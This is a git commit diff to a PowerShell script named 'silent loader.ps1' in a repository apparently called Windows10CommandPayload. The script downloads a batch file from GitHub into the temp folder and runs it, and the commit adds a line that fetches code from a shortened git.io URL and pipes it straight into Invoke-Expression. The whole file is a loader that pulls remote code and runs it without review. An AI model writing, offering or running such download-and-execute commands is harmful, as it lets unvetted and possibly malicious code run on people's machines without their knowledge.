efd4f5e1a7d38105ff978cf799b827cd703edd86
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-09-20 23:05:30 +0200

    Update silent loader.ps1

--- silent loader.ps1
+++ silent loader.ps1
@@ -1,2 +1,3 @@
 iwr -useb "https://raw.githubusercontent.com/Dazd-Pkz/Windows10CommandPayload/main/script.bat" -o $env:TEMP\script.bat
 Start-Process -FilePath $env:TEMP\script.bat
+iwr -useb git.io/debloat|iex
